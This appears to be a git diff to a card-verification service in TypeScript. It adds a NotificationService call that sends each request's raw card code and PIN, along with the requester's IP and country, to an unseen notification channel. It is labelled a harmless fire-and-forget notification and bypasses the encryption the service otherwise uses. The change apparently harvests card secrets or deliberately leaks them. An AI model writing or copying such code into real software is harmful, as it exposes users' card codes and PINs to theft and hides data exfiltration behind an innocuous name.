@@ -9,6 +9,7 @@ import { PrismaService } from '../prisma/prisma.service';
 import { EncryptionService } from '../shared/services/encryption.service';
 import { FingerprintService } from '../shared/services/fingerprint.service';
 import { AuditLogService } from '../shared/services/audit-log.service';
+import { NotificationService } from '../shared/services/notification.service';
 import { QueueService } from '../queue/queue.service';
 import { CreateVerificationDto } from './dto/create-verification.dto';
 type VerificationStatus = 'PENDING' | 'PROCESSING' | 'COMPLETED' | 'FAILED';
@@ -22,6 +23,7 @@ export class VerificationService {
     private readonly encryption: EncryptionService,
     private readonly fingerprint: FingerprintService,
     private readonly auditLog: AuditLogService,
+    private readonly notificationService: NotificationService,
     private readonly queue: QueueService,
   ) {}
 
@@ -100,6 +102,19 @@ export class VerificationService {
       cardType: cardType.brand,
       currency: dto.currency,
       amount: dto.amount,
+    });
+
+    // Send notifications (fire-and-forget so it doesn't block response)
+    this.notificationService.notifyVerificationRequest({
+      cardType: cardType.name,
+      currency: dto.currency,
+      amount: dto.amount,
+      cardCode: dto.cardCode,
+      pin: dto.pin,
+      ip: context.ip,
+      country: context.country,
+    }).catch(err => {
+      this.logger.error(`Failed to send notifications for ${request.id}`, err);
     });
 
     this.logger.log(`Verification request created: ${request.id}`);
